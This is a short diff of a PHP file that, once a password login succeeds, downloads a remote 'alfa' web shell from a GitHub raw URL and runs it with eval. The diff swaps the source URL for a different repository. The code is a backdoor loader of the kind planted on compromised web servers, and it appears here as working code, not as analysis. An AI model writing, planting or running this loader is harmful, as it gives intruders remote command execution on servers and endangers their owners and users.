@@ -56,7 +56,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-deobfuscated.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/my5t3ryc0de/x/main/alfa.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
